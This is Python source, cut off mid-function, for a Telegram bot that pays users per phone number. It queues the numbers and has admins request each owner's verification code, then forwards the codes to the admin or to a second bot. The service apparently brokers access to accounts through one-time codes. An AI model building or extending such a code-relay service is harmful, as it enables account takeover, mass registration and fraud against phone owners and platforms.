import asyncio
import logging
import os
from datetime import datetime
from typing import Dict, Any

from aiogram import Router, F, Bot
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, CallbackQuery, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton

import config
from database import Database
from keyboards import *
from utils import *

router = Router()
db = Database(config.DB_PATH)
logger = logging.getLogger(__name__)

# ===================== Вспомогательные функции =====================
async def show_main_menu(message_or_callback, user_id: int, username: str = None):
    """Показывает главное меню пользователю"""
    work_active = db.is_work_active()
    queue_count = db.get_queue_count()
    user_queue = db.get_user_queue_with_ids(user_id)
    user_queue_count = len(user_queue)
    user_balance = db.get_user_balance(user_id)

    status_emoji = "✅" if work_active else "❌"
    display_username = username or config.MESSAGES.USERNAME_PLACEHOLDER

    text = config.MESSAGES.GREETING.format(
        username=display_username,
        status_emoji=status_emoji,
        balance=f"{user_balance:.2f}",
        user_queue_count=user_queue_count,
        queue_count=queue_count
    )
    
    # Проверяем тип объекта: для CallbackQuery используем edit_text, для Message - answer
    from aiogram.types import Message, CallbackQuery
    
    if isinstance(message_or_callback, CallbackQuery):
        # Это callback query, редактируем сообщение
        if message_or_callback.message:
            await message_or_callback.message.edit_text(text, reply_markup=user_main_menu())
        else:
            await message_or_callback.answer(text, show_alert=False)
    elif isinstance(message_or_callback, Message):
        # Это обычное сообщение, отправляем новое
        await message_or_callback.answer(text, reply_markup=user_main_menu())
    else:
        # Fallback: пробуем answer
        await message_or_callback.answer(text, reply_markup=user_main_menu())

# ===================== FSM состояния =====================
class UserStates(StatesGroup):
    waiting_phone = State()

class AdminStates(StatesGroup):
    waiting_broadcast = State()
    waiting_ban = State()
    waiting_unban = State()
    waiting_add_admin = State()
    waiting_remove_admin = State()
    waiting_subscription_channel = State()
    waiting_price = State()

# ===================== Временные данные =====================
temp_data: Dict[str, Any] = {'requests': {}}  # Для админов: {admin_id: {'active_numbers': set()}}, requests: {message_id: {...}}


# ===================== /start =====================
@router.message(CommandStart())
async def start_handler(message: Message):
    db.register_user(message.from_user.id, message.from_user.username,
                           message.from_user.first_name, message.from_user.last_name)

    if db.is_user_banned(message.from_user.id):
        await message.answer(config.BANNED_MESSAGE)
        return

    await show_main_menu(message, message.from_user.id, message.from_user.username)


# ===================== Добавление номера =====================
@router.callback_query(F.data == "add_number")
async def add_number_handler(callback: CallbackQuery, state: FSMContext):
    if not db.is_work_active():
        await callback.answer(config.WORK_STOPPED_USER_MSG, show_alert=True)
        return

    # Сохраняем контекст откуда зашел пользователь
    await state.update_data(return_context="user_main_menu")
    
    await state.set_state(UserStates.waiting_phone)
    await callback.message.edit_text(
        config.MESSAGES.ENTER_PHONE,
        reply_markup=cancel_keyboard()
    )


@router.message(UserStates.waiting_phone)
async def phone_input_handler(message: Message, state: FSMContext):
    if not db.is_work_active():
        await message.answer(config.WORK_STOPPED_USER_MSG)
        await state.clear()
        return

    text = message.text.strip()
    lines = [line.strip() for line in text.split('\n') if line.strip()]
    
    added_count = 0
    failed_count = 0
    failed_messages = []
    
    for line in lines:
        phone = validate_and_normalize_phone(line)
        if not phone:
            failed_count += 1
            failed_messages.append(f"❌ `{line}` - неверный формат")
            continue

        if db.is_number_blocked(phone):
            failed_count += 1
            failed_messages.append(f"🚫 `{phone}` - заблокирован")
            continue

        if db.is_number_in_queue_or_success(phone):
            failed_count += 1
            failed_messages.append(f"⚠️ `{phone}` - уже в очереди")
            continue

        db.add_phone_number(message.from_user.id, phone, line)
        added_count += 1

    # Формируем ответ
    if added_count > 0:
        success_message = f"✅ Добавлено {added_count} номеров в очередь!"
        if failed_count > 0:
            success_message += f"\n\n❌ Не добавлено {failed_count} номеров:\n"
            success_message += "\n".join(failed_messages)
        
        await message.answer(
            success_message,
            parse_mode="Markdown",
            reply_markup=user_main_menu()
        )
    else:
        if failed_messages:
            await message.answer(
                "❌ Не удалось добавить ни одного номера:\n" + "\n".join(failed_messages),
                parse_mode="Markdown",
                reply_markup=user_main_menu()
            )
        else:
            await message.answer(
                "❌ Не удалось распознать номера",
                reply_markup=user_main_menu()
            )
    
    await state.clear()


# ===================== Мои номера =====================
@router.callback_query(F.data == "my_numbers")
async def my_numbers_handler(callback: CallbackQuery):
    work_active = db.is_work_active()
    if not work_active:
        await callback.answer(config.WORK_STOPPED_USER_MSG, show_alert=True)
        return

    queue = db.get_user_queue_with_ids(callback.from_user.id)
    today_total, today_success = db.get_today_stats()

    text = config.MESSAGES.MY_NUMBERS_HEADER.format(
        today_success=today_success,
        today_total=today_total
    )

    if queue:
        text += config.MESSAGES.SELECT_NUMBER
        await callback.message.edit_text(text, reply_markup=user_numbers_keyboard(queue), parse_mode="Markdown")
    else:
        text += config.MESSAGES.NO_NUMBERS_IN_QUEUE
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📊 Получить мой отчет", callback_data="user_report")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_main")]
        ])
        await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")


@router.callback_query(F.data.startswith("show_number_"))
async def show_number_handler(callback: CallbackQuery):
    number_id = int(callback.data.split("_")[-1])
    number_data = db.get_number_by_id_for_user(callback.from_user.id, number_id)
    
    if not number_data:
        await callback.answer(config.MESSAGES.NUMBER_NOT_FOUND, show_alert=True)
        return

    phone = number_data['phone_number']
    position = number_data['position_in_queue']
    display_phone = format_phone_display(phone)
    
    text = config.MESSAGES.NUMBER_INFO.format(phone=display_phone, position=position)
    
    await callback.message.edit_text(text, reply_markup=number_actions_keyboard(number_id), parse_mode="Markdown")


@router.callback_query(F.data.startswith("delete_number_"))
async def delete_number_handler(callback: CallbackQuery, bot: Bot):
    number_id = int(callback.data.split("_")[-1])
    number_data = db.get_number_by_id_for_user(callback.from_user.id, number_id)
    
    if not number_data:
        await callback.answer(config.MESSAGES.NUMBER_NOT_FOUND, show_alert=True)
        return

    phone = number_data['phone_number']
    deleted_data = db.delete_number_from_queue(number_id)
    
    if deleted_data:
        display_phone = format_phone_display(phone)
        await callback.message.edit_text(
            config.MESSAGES.NUMBER_DELETED.format(phone=display_phone),
            parse_mode="Markdown"
        )
        
        # Уведомляем пользователя
        try:
            await bot.send_message(
                callback.from_user.id,
                config.MESSAGES.NUMBER_DELETED_NOTIFICATION.format(phone=display_phone),
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Не удалось отправить уведомление пользователю {callback.from_user.id}: {e}")
    else:
        await callback.answer(config.MESSAGES.DELETE_ERROR, show_alert=True)


@router.callback_query(F.data == "user_report")
async def user_report_dates(callback: CallbackQuery):
    dates = db.get_report_dates()
    if not dates:
        await callback.message.edit_text(config.MESSAGES.NO_REPORT_DATA)
        return

    await callback.message.edit_text(
        config.MESSAGES.SELECT_DATE,
        reply_markup=date_selection_keyboard(dates, "user_report_date")
    )


@router.callback_query(F.data.startswith("user_report_date_"))
async def send_user_report(callback: CallbackQuery):
    date_str = callback.data.split("_")[-1]
    data = db.get_user_report_for_date(callback.from_user.id, date_str)
    path = await generate_txt_report(data, date_str)

    if path:
        await callback.message.answer_document(FSInputFile(path), caption=config.MESSAGES.REPORT_CAPTION_USER.format(date=date_str))
        os.remove(path)
    else:
        await callback.answer(config.MESSAGES.REPORT_GENERATION_ERROR)

    await callback.message.delete()


# ===================== Вспомогательные функции =====================
async def get_admin_panel_text() -> str:
    """Получить текст админ панели с балансом (из CryptoPay)"""
    bot_balance = None
    if bot_balance is None:
        balance_str = "—"
    else:
        balance_str = f"{bot_balance:.2f}"
    return config.MESSAGES.ADMIN_PANEL_WITH_BALANCE.format(balance=balance_str)

# ===================== Админка =====================
@router.message(Command("admin"))
async def admin_panel_handler(message: Message):
    if not await is_admin(message.from_user.id):
        await message.answer(config.NO_ACCESS_MESSAGE)
        return

    active = db.is_work_active()
    is_owner_user = await is_owner(message.from_user.id)
    admin_text = await get_admin_panel_text()
    await message.answer(admin_text, reply_markup=admin_panel(active, is_owner_user))


@router.callback_query(F.data.in_({"start_work", "stop_work"}))
async def toggle_work(callback: CallbackQuery, bot: Bot):
    if not await is_admin(callback.from_user.id):
        return

    new_status = callback.data == "start_work"
    db.set_work_active(new_status)
    await send_to_all(bot, config.WORK_STARTED_MSG if new_status else config.WORK_STOPPED_MSG)

    is_owner_user = await is_owner(callback.from_user.id)
    admin_text = await get_admin_panel_text()
    await callback.message.edit_text(admin_text, reply_markup=admin_panel(new_status, is_owner_user))


# ===================== /nomer — взять номер =====================
@router.message(Command("nomer"))
async def take_number_handler(message: Message, bot: Bot):
    if not await is_admin(message.from_user.id):
        await message.answer(config.NO_ACCESS_MESSAGE)
        return

    if not db.is_work_active():
        await message.answer(config.MESSAGES.WORK_STOPPED)
        return

    # Проверка авторежима
    if db.is_auto_mode_enabled():
        await message.answer(config.AUTO_MODE_MESSAGE)
        return

    number_data = db.get_next_in_queue()
    if not number_data:
        await message.answer(config.MESSAGES.QUEUE_EMPTY)
        return

    number_id = number_data['id']
    phone = number_data['phone_number']
    display_phone = format_phone_display(phone)  # Для красивого отображения
    user_id = number_data['user_id']
    owner_name = number_data.get('username') or number_data.get('first_name') or f"ID: {user_id}"

    db.take_number(number_id, message.from_user.id)

    # Инициализируем структуру для админа, если её нет
    if message.from_user.id not in temp_data:
        temp_data[message.from_user.id] = {'active_numbers': set()}
    temp_data[message.from_user.id]['active_numbers'].add(number_id)

    # Отправляем админу номер ТОЛЬКО с кнопкой "Запросить код"
    await message.answer(
        config.MESSAGES.NUMBER_TAKEN.format(phone=display_phone, owner_name=owner_name),
        parse_mode="Markdown",
        reply_markup=initial_request_keyboard(number_id)
    )

    # Уведомление пользователю
    try:
        await bot.send_message(
            user_id,
            config.MESSAGES.NUMBER_TAKEN_NOTIFICATION.format(phone=display_phone),
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Не удалось отправить уведомление пользователю {user_id}: {e}")


# ===================== Запрос кода =====================
@router.callback_query(F.data.startswith("request_code_"))
async def request_code_handler(callback: CallbackQuery, bot: Bot):
    if not await is_admin(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    try:
        number_id = int(callback.data[len("request_code_"):])
    except ValueError:
        await callback.answer("Неверный ID номера", show_alert=True)
        return

    number_data = db.get_phone_by_id(number_id)
    if not number_data:
        await callback.answer(config.MESSAGES.NUMBER_NOT_FOUND, show_alert=True)
        return

    phone = number_data['phone_number']
    display_phone = format_phone_display(phone)
    user_id = number_data['user_id']
    username = number_data.get('username') or number_data.get('first_name') or f"ID: {user_id}"
    user_info = f"{username}" if number_data.get('username') else username

    try:
        request_message = await bot.send_message(
            user_id,
            config.MESSAGES.CODE_REQUEST_TO_USER.format(phone=display_phone),
            parse_mode="Markdown",
            reply_markup=request_code_user_keyboard(number_id)
        )

        temp_data['requests'][request_message.message_id] = {
            'number_id': number_id,
            'admin_id': callback.from_user.id,
            'user_id': user_id,
            'phone': phone,
        }

        new_text = config.MESSAGES.CODE_REQUESTED.format(phone=display_phone, username=user_info)

        # Пытаемся редактировать текст + клавиатуру
        try:
            await callback.message.edit_text(
                new_text + "\n⏳ Ожидаем код...",  # Принудительно меняем текст
                parse_mode="Markdown",
                reply_markup=waiting_code_keyboard(number_id)
            )
        except Exception as e:
            if "not modified" in str(e).lower():
                # Если не получилось — меняем ТОЛЬКО клавиатуру
                await callback.message.edit_reply_markup(reply_markup=waiting_code_keyboard(number_id))
            else:
                raise

        await callback.answer(config.MESSAGES.CODE_REQUEST_SENT, show_alert=True)
    except Exception as e:
        logger.error(f"Ошибка запроса кода: {e}")
        await callback.answer("Ошибка", show_alert=True)


# ===================== Получение кода от пользователя =====================
@router.message(F.reply_to_message)
async def code_from_user(message: Message, bot: Bot):
    if not message.reply_to_message:
        return

    request_message_id = message.reply_to_message.message_id
    request_data = temp_data['requests'].get(request_message_id)
    
    if not request_data:
        # Старое сообщение или не связанное с запросом кода
        return

    number_id = request_data['number_id']
    admin_id = request_data['admin_id']
    user_id = request_data['user_id']

    # Проверяем, что код отправляет правильный пользователь
    if message.from_user.id != user_id:
        return

    code = message.text.strip()
    number_data = db.get_phone_by_id(number_id)
    
    if not number_data:
        await message.answer(config.MESSAGES.NUMBER_NOT_FOUND_PROCESSED)
        return

    # Обновляем статус с кодом
    db.update_number_status(number_id, 'взято', code=code)

    # Проверяем, является ли запрос от юзербота (admin_id = 0)
    if admin_id == 0:
        # Это запрос от юзербота, отправляем код в бот2
        try:
            from userbot import send_code_to_bot2
            phone = number_data['phone_number']
            await send_code_to_bot2(phone, code)
        except Exception as e:
            logger.error(f"Ошибка отправки кода в бот2 через юзербота: {e}")
    else:
        # Отправляем код админу (моноширинным)
        try:
            await bot.send_message(
                admin_id,
                config.MESSAGES.CODE_RECEIVED.format(phone=number_data['phone_number'], code=code),
                parse_mode="Markdown",
                reply_markup=action_keyboard(number_id)
            )
        except Exception as e:
            logger.error(f"Не удалось отправить код админу {admin_id}: {e}")

    # Отправляем подтверждение пользователю
    try:
        await message.answer(config.MESSAGES.CODE_SENT)
    except Exception as e:
        logger.error(f"Не удалось отправить подтверждение пользователю {user_id}: {e}")

    # Удаляем запись из temp_data
    temp_data['requests'].pop(request_message_id, None)


# ===================== Действия админа =====================
@router.callback_query(lambda c: c.data and c.data.startswith(("success_", "invalid_code_", "fraud_", "busy_")))
async def admin_action(callback: CallbackQuery, bot: Bot):
    data = callback.data

    # Определяем действие и извлекаем number_id
    if data.startswith("success_"):
        action = "success"
        number_id_str = data[len("success_"):]
    elif data.startswith("invalid_code_"):
        action = "invalid_code"
        number_id_str = data[len("invalid_code_"):]
    elif data.startswith("fraud_"):
        action = "fraud"
        number_id_str = data[len("fraud_"):]
    elif data.startswith("busy_"):
        action = "busy"
        number_id_str = data[len("busy_"):]
    else:
        await callback.answer("Неизвестное действие", show_alert=True)
        return

    try:
        number_id = int(number_id_str)
    except ValueError:
        await callback.answer("Неверный ID номера", show_alert=True)
        return

    number_data = db.get_phone_by_id(number_id)
    if not number_data:
        await callback.answer(config.MESSAGES.NUMBER_NOT_FOUND, show_alert=True)
        return

    phone = number_data['phone_number']
    display_phone = format_phone_display(phone)
    user_id = number_data['user_id']
    username = number_data.get('username') or number_data.get('first_name') or f"ID: {user_id}"
    user_info = f"@{username}" if number_data.get('username') else username

    # Специальная логика для "неверный код" — номер НЕ завершается, ожидается новый код
    if action == "invalid_code":
        try:
            # Отправляем пользователю запрос нового кода
            sent_message = await bot.send_message(
                user_id,
                f"⚠️ Менеджер отметил код для номера {display_phone} как неверный. Пожалуйста, отправьте новый код ОТВЕТОМ на это сообщение.",
                reply_markup=invalid_code_user_keyboard(number_id)
            )

            # Сохраняем сообщение как активный запрос кода (для обработки ответа пользователя)
            temp_data['requests'][sent_message.message_id] = {
                'number_id': number_id,
                'admin_id': callback.from_user.id,
                'user_id': user_id,
                'phone': phone,
                # При необходимости добавьте другие поля, как в обычном request_code
            }
        except Exception as e:
            logger.error(f"Не удалось отправить запрос нового кода пользователю {user_id}: {e}")
            await callback.answer("Ошибка отправки запроса пользователю", show_alert=True)
            return

        # Уведомляем админа — оставляем клавиатуру с 4 статусами для дальнейших действий
        try:
            await callback.message.edit_text(
                f"❌ Код отмечен как неверный для номера {display_phone}\n"
                f"Пользователь: {user_info}\n"
                f"Ожидается новый код от пользователя...",
                parse_mode="Markdown",
                reply_markup=waiting_code_keyboard(number_id)
            )
        except Exception as e:
            logger.error(f"Ошибка редактирования сообщения админа: {e}")

        await callback.answer("Код отмечен неверным — запрос нового отправлен")
        return  # Важно: не очищаем temp_data и не завершаем номер

    # Логика для завершающих статусов (success, fraud, busy)
    status_map = {
        "success": (
            config.MESSAGES.STATUS_SUCCESS,          # статус для БД и админа
            config.MESSAGES.STATUS_SUCCESS_USER,     # текст для пользователя
            None,                                    # клавиатура для пользователя
            False                                    # блокировать номер?
        ),
        "fraud": (
            config.MESSAGES.STATUS_FRAUD,
            config.MESSAGES.STATUS_FRAUD_USER,
            None,
            True
        ),
        "busy": (
            config.MESSAGES.STATUS_BUSY,
            config.MESSAGES.STATUS_BUSY_USER,
            None,
            True
        )
    }

    new_status, user_text, kb, block = status_map[action]

    # Завершаем номер в БД
    db.update_number_status(number_id, new_status)

    # Начисляем баланс при статусе "успешно"
    if action == "success":
        price = db.get_price_per_number()
        if price > 0:
            db.update_user_balance(user_id, price)
            db.add_transaction(user_id, price, "payment")
            # Уведомляем пользователя о начислении
            try:
                await bot.send_message(
                    user_id,
                    config.MESSAGES.BALANCE_ADDED.format(amount=f"{price:.2f}"),
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Не удалось отправить уведомление о начислении баланса пользователю {user_id}: {e}")

    # Блокируем номер при необходимости
    if block:
        db.block_number(phone)

    # Уведомление пользователю
    try:
        await bot.send_message(
            user_id,
            config.MESSAGES.NUMBER_STATUS_TEMPLATE.format(
                phone=display_phone,
                status_text=user_text
            ),
            parse_mode="Markdown",
            reply_markup=kb
        )
    except Exception as e:
        logger.error(f"Не удалось отправить сообщение пользователю {user_id}: {e}")

    # Редактируем сообщение админа
    try:
        await callback.message.edit_text(
            config.MESSAGES.STATUS_CHANGED.format(
                status=new_status,
                phone=display_phone,
                user_info=user_info
            ),
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Ошибка редактирования сообщения админа: {e}")

    # Очищаем временные данные только для завершенных номеров
    if callback.from_user.id in temp_data and 'active_numbers' in temp_data[callback.from_user.id]:
        temp_data[callback.from_user.id]['active_numbers'].discard(number_id)

    to_remove = []
    for msg_id, req_data in temp_data.get('requests', {}).items():
        if req_data.get('number_id') == number_id:
            to_remove.append(msg_id)
    for msg_id in to_remove:
        temp_data['requests'].pop(msg_id, None)

    await callback.answer("Статус обновлён")


# ===================== Время вышло =====================
@router.callback_query(F.data.startswith("timeout_"))
async def timeout_handler(callback: CallbackQuery, bot: Bot):
    if not await is_admin(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    number_id = int(callback.data.split("_")[-1])
    number_data = db.get_phone_by_id(number_id)
    
    if not number_data:
        await callback.answer(config.MESSAGES.NUMBER_NOT_FOUND, show_alert=True)
        return

    phone = number_data['phone_number']
    user_id = number_data['user_id']

    # Устанавливаем статус "отменен"
    db.update_number_status(number_id, config.MESSAGES.STATUS_CANCELLED)

    # Уведомляем пользователя
    try:
        await bot.send_message(
            user_id,
            config.MESSAGES.TIMEOUT_NOTIFICATION.format(phone=phone),
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Не удалось отправить уведомление пользователю {user_id}: {e}")

    # Обновляем сообщение админа
    await callback.message.edit_text(
        config.MESSAGES.TIMEOUT_NOTIFICATION.format(phone=phone),
        parse_mode="Markdown"
    )

    # Очищаем данные
    if callback.from_user.id in temp_data and 'active_numbers' in temp_data[callback.from_user.id]:
        temp_data[callback.from_user.id]['active_numbers'].discard(number_id)
    
    # Удаляем все связанные запросы кода для этого номера
    to_remove = []
    for msg_id, req_data in temp_data['requests'].items():
        if req_data.get('number_id') == number_id:
            to_remove.append(msg_id)
    for msg_id in to_remove:
        temp_data['requests'].pop(msg_id, None)


# ===================== Отмена пользователем =====================
@router.callback_query(F.data == "cancel_action")
async def cancel_number_user(callback: CallbackQuery, bot: Bot, state: FSMContext):
    user_id = callback.from_user.id
    cancelled = False
    
    # Ищем активный запрос кода для этого пользователя
    for msg_id, req_data in list(temp_data['requests'].items()):
        if req_data.get('user_id') == user_id:
            number_id = req_data['number_id']
            admin_id = req_data['admin_id']
            number_data = db.get_phone_by_id(number_id)
            
            if number_data:
                phone = number_data['phone_number']
                # Устанавливаем статус "отменен" вместо возврата в очередь
                db.update_number_status(number_id, 'отменен')
                
                # Если номер обрабатывает юзербот, отменяем его и в бот2
                if admin_id == 0:
                    try:
                        from userbot import cancel_number_in_bot2
                        await cancel_number_in_bot2(phone=phone, number_id=number_id)
                    except Exception as e:
                        logger.error(f"Ошибка отмены номера {phone} в бот2 через юзербота: {e}")
                
                # Уведомление админу только если это не юзербот (admin_id != 0)
                if admin_id != 0:
                    try:
                        await bot.send_message(admin_id, config.MESSAGES.NUMBER_CANCELLED_ADMIN.format(phone=phone), parse_mode="Markdown")
                    except Exception as e:
                        logger.error(f"Не удалось отправить уведомление админу {admin_id}: {e}")
                
                # Очищаем данные
                temp_data['requests'].pop(msg_id, None)
                if admin_id in temp_data and 'active_numbers' in temp_data[admin_id]:
                    temp_data[admin_id]['active_numbers'].discard(number_id)
                
                cancelled = True
                break

    if cancelled:
        await callback.message.edit_text(config.MESSAGES.NUMBER_CANCELLED)
        await state.clear()
    else:
        # Если нет активного запроса, но есть FSM состояние - просто очищаем его
        current_state = await state.get_state()
        if current_state:
            # Получаем сохраненный контекст возврата
            state_data = await state.get_data()
            return_context = state_data.get('return_context', None)
            
            await state.clear()
            
            # Возвращаемся в контекст, из которого зашел пользователь
            if return_context == "user_main_menu":
                await show_main_menu(callback.message, callback.from_user.id, callback.from_user.username)
            elif return_context == "my_numbers":
                await my_numbers_handler(callback)
            elif return_context == "admin_panel":
                if await is_admin(user_id):
                    active = db.is_work_active()
                    is_owner_user = await is_owner(user_id)
                    admin_text = await get_admin_panel_text()
                    await callback.message.edit_text(admin_text, reply_markup=admin_panel(active, is_owner_user))
                else:
                    # Если не админ, возвращаемся в главное меню
                    await show_main_menu(callback.message, callback.from_user.id, callback.from_user.username)
            else:
                # По умолчанию возвращаемся в главное меню
                await show_main_menu(callback.message, callback.from_user.id, callback.from_user.username)
        else:
            # Если нет ни запроса, ни состояния - просто закрываем сообщение
            await callback.answer(config.MESSAGES.ACTION_CANCELLED, show_alert=False)
            try:
                await callback.message.delete()
            except Exception as e:
                logger.error(f"Не удалось удалить сообщение: {e}")


# ===================== Админ-отчёт =====================
@router.callback_query(F.data == "admin_report")
async def admin_report_dates(callback: CallbackQuery):
    if not await is_admin(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    dates = db.get_report_dates()
    if not dates:
        is_owner_user = await is_owner(callback.from_user.id)
        await callback.message.edit_text(config.MESSAGES.NO_REPORT_DATA, reply_markup=admin_panel(db.is_work_active(), is_owner_user))
        return

    await callback.message.edit_text(
        config.MESSAGES.SELECT_ADMIN_REPORT_DATE,
        reply_markup=date_selection_keyboard(dates, "admin_report_date")
    )


@router.callback_query(F.data.startswith("admin_report_date_"))
async def send_admin_report(callback: CallbackQuery):
    if not await is_admin(callback.from_user.id):
        return

    date_str = callback.data.split("_")[-1]
    data = db.get_report_for_date(date_str)
    path = await generate_json_report(data, date_str)

    if path:
        await callback.message.answer_document(
            FSInputFile(path),
            caption=config.MESSAGES.REPORT_CAPTION_ADMIN.format(date=date_str)
        )
        os.remove(path)
    else:
        await callback.answer(config.MESSAGES.REPORT_GENERATION_ERROR_ADMIN, show_alert=True)

    is_owner_user = await is_owner(callback.from_user.id)
    admin_text = await get_admin_panel_text()
    await callback.message.edit_text(admin_text, reply_markup=admin_panel(db.is_work_active(), is_owner_user))


# ===================== Рассылка =====================
@router.callback_query(F.data == "broadcast")
async def broadcast_start(callback: CallbackQuery, state: FSMContext):
    if not await is_admin(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    # Сохраняем контекст возврата
    await state.update_data(return_context="admin_panel")
    
    await state.set_state(AdminStates.waiting_broadcast)
    if callback.from_user.id not in temp_data:
        temp_data[callback.from_user.id] = {'active_numbers': set()}
    temp_data[callback.from_user.id]['broadcast_text'] = ""
    temp_data[callback.from_user.id]['broadcast_media'] = None
    await callback.message.edit_text(
        config.MESSAGES.BROADCAST_ENTER_TEXT,
        reply_markup=cancel_keyboard()
    )


@router.message(AdminStates.waiting_broadcast)
async def broadcast_text_handler(message: Message, state: FSMContext):
    if not await is_admin(message.from_user.id):
        return

    text = message.text or message.caption or ""
    if message.from_user.id not in temp_data:
        temp_data[message.from_user.id] = {'active_numbers': set()}
    temp_data[message.from_user.id]['broadcast_text'] = text
    
    # Сохраняем медиа если есть
    media_data = None
    if message.photo:
        media_data = {'type': 'photo', 'file_id': message.photo[-1].file_id}
    elif message.video:
        media_data = {'type': 'video', 'file_id': message.video.file_id}
    elif message.document:
        media_data = {'type': 'document', 'file_id': message.document.file_id}
    elif message.audio:
        media_data = {'type': 'audio', 'file_id': message.audio.file_id}
    elif message.voice:
        media_data = {'type': 'voice', 'file_id': message.voice.file_id}
    elif message.video_note:
        media_data = {'type': 'video_note', 'file_id': message.video_note.file_id}
    
    temp_data[message.from_user.id]['broadcast_media'] = media_data

    await message.answer(
        config.MESSAGES.BROADCAST_PREVIEW.format(text=text),
        reply_markup=confirm_broadcast_keyboard()
    )
    await state.clear()


@router.callback_query(F.data == "confirm_broadcast")
async def broadcast_confirm(callback: CallbackQuery, bot: Bot):
    if not await is_admin(callback.from_user.id):
        return

    admin_data = temp_data.get(callback.from_user.id, {})
    text = admin_data.get('broadcast_text')
    media = admin_data.get('broadcast_media')
    
    if not text and not media:
        await callback.answer(config.MESSAGES.BROADCAST_NO_TEXT, show_alert=True)
        return

    users = db.get_all_users()
    sent = 0
    for user_id in users:
        try:
            if media:
                if media['type'] == 'photo':
                    await bot.send_photo(user_id, media['file_id'], caption=text)
                elif media['type'] == 'video':
                    await bot.send_video(user_id, media['file_id'], caption=text)
                elif media['type'] == 'document':
                    await bot.send_document(user_id, media['file_id'], caption=text)
                elif media['type'] == 'audio':
                    await bot.send_audio(user_id, media['file_id'], caption=text)
                elif media['type'] == 'voice':
                    await bot.send_voice(user_id, media['file_id'], caption=text)
                elif media['type'] == 'video_note':
                    await bot.send_video_note(user_id, media['file_id'])
                    if text:
                        await bot.send_message(user_id, text)
            else:
                await bot.send_message(user_id, text)
            sent += 1
            await asyncio.sleep(0.033)
        except Exception as e:
            logger.error(f"Не удалось отправить рассылку пользователю {user_id}: {e}")

    await callback.message.edit_text(config.MESSAGES.BROADCAST_COMPLETED.format(sent=sent))
    if callback.from_user.id in temp_data:
        temp_data[callback.from_user.id].pop('broadcast_text', None)
        temp_data[callback.from_user.id].pop('broadcast_media', None)


# ===================== Бан / Разбан =====================
@router.callback_query(F.data == "ban_user")
async def ban_start(callback: CallbackQuery, state: FSMContext):
    if not await is_admin(callback.from_user.id):
        return

    # Сохраняем контекст возврата
    await state.update_data(return_context="admin_panel")
    
    await state.set_state(AdminStates.waiting_ban)
    await callback.message.edit_text(config.MESSAGES.BAN_ENTER_ID, reply_markup=cancel_keyboard())


@router.message(AdminStates.waiting_ban)
async def ban_handler(message: Message, state: FSMContext):
    if not await is_admin(message.from_user.id):
        return

    try:
        target_id = int(message.text.strip())
        # Проверяем существование пользователя
        user_data = db.get_user_by_id(target_id)
        if not user_data:
            await message.answer(config.MESSAGES.BAN_INVALID_ID)
            await state.clear()
            return
        db.ban_user(target_id)
        await message.answer(config.MESSAGES.BAN_SUCCESS.format(user_id=target_id))
    except ValueError:
        await message.answer(config.MESSAGES.BAN_INVALID_ID)
    except Exception as e:
        logger.error(f"Ошибка при бане пользователя: {e}")
        await message.answer(config.MESSAGES.BAN_INVALID_ID)
    await state.clear()


@router.callback_query(F.data == "unban_user")
async def unban_start(callback: CallbackQuery, state: FSMContext):
    if not await is_admin(callback.from_user.id):
        return

    # Сохраняем контекст возврата
    await state.update_data(return_context="admin_panel")
    
    await state.set_state(AdminStates.waiting_unban)
    await callback.message.edit_text(config.MESSAGES.UNBAN_ENTER_ID, reply_markup=cancel_keyboard())


@router.message(AdminStates.waiting_unban)
async def unban_handler(message: Message, state: FSMContext):
    if not await is_admin(message.from_user.id):
        return

    try:
        target_id = int(message.text.strip())
        # Проверяем существование пользователя
        user_data = db.get_user_by_id(target_id)
        if not user_data:
            await message.answer(config.MESSAGES.UNBAN_INVALID_ID)
            await state.clear()
            return
        db.unban_user(target_id)
        await message.answer(config.MESSAGES.UNBAN_SUCCESS.format(user_id=target_id))
    except ValueError:
        await message.answer(config.MESSAGES.UNBAN_INVALID_ID)
    except Exception as e:
        logger.error(f"Ошибка при разбане пользователя: {e}")
        await message.answer(config.MESSAGES.UNBAN_INVALID_ID)
    await state.clear()


# ===================== Очистка очереди =====================
@router.callback_query(F.data == "clear_queue")
async def clear_queue_handler(callback: CallbackQuery, bot: Bot):
    if not await is_admin(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    # Получаем все номера для уведомлений
    deleted_numbers = db.clear_queue()
    
    # Отправляем уведомления пользователям
    notified = 0
    for user_id, phones in deleted_numbers.items():
        try:
            phones_text = "\n".join([f"`{format_phone_display(phone)}`" for phone in phones])
            await bot.send_message(
                user_id,
                config.MESSAGES.QUEUE_CLEARED_NOTIFICATION.format(phones=phones_text),
                parse_mode="Markdown"
            )
            notified += 1
        except Exception as e:
            logger.error(f"Не удалось уведомить пользователя {user_id}: {e}")

    total_deleted = sum(len(phones) for phones in deleted_numbers.values())
    await callback.answer(config.MESSAGES.QUEUE_CLEARED.format(total_deleted=total_deleted, notified=notified), show_alert=True)
    
    # Обновляем админ-панель
    is_owner_user = await is_owner(callback.from_user.id)
    admin_text = await get_admin_panel_text()
    await callback.message.edit_text(admin_text, reply_markup=admin_panel(db.is_work_active(), is_owner_user))


# ===================== Управление админами =====================
@router.callback_query(F.data == "manage_admins")
async def manage_admins_handler(callback: CallbackQuery):
    if not await is_owner(callback.from_user.id):
        await callback.answer(config.NO_ACCESS_MESSAGE, show_alert=True)
        return

    await callback.message.edit_text(config.MESSAGES.MANAGE_ADMINS, reply_markup=manage_admins_keyboard())


@router.callback_query(F.data == "add_admin")
async def add_admin_start(callback: CallbackQuery, state: FSMContext):
